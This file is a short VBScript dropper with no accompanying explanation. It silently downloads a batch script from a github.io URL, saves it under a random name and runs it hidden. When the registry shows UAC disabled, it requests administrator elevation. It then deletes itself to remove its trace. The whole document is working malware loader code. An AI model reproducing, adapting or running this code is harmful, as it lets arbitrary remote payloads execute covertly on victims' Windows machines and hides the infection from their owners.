On Error Resume Next
Dim filesys, tempname
Set filesys = CreateObject("Scripting.FileSystemObject")
tempname = filesys.GetTempName

Set oShell = CreateObject("WScript.Shell")
Set WshNetwork = WScript.CreateObject("WScript.Network")
scriptdir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
temp_dir = scriptdir & "\" & tempname & ".bat"
temp_url = "https://cryptedlumos.github.io/Boot/startup.txt"
Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP")
Set objFileToWrite = CreateObject("Scripting.FileSystemObject").OpenTextFile(temp_dir,2,true)
xmlhttp.open "GET", temp_url, 0
xmlhttp.send ""
objFileToWrite.WriteLine(xmlhttp.responseText)
objFileToWrite.Close
Set xmlhttp = Nothing
Set objFileToWrite = Nothing
Dim Shell
Set Shell = CreateObject("Shell.Application")
If(oShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin") = "0" AND oShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA") = "0") Then
Shell.ShellExecute temp_dir, , , "runas", 0
Else
Shell.ShellExecute temp_dir, , , , 0
End If
Set objFSO = CreateObject( "Scripting.FileSystemObject" )
objFSO.DeleteFile WScript.ScriptFullName
WScript.Quit

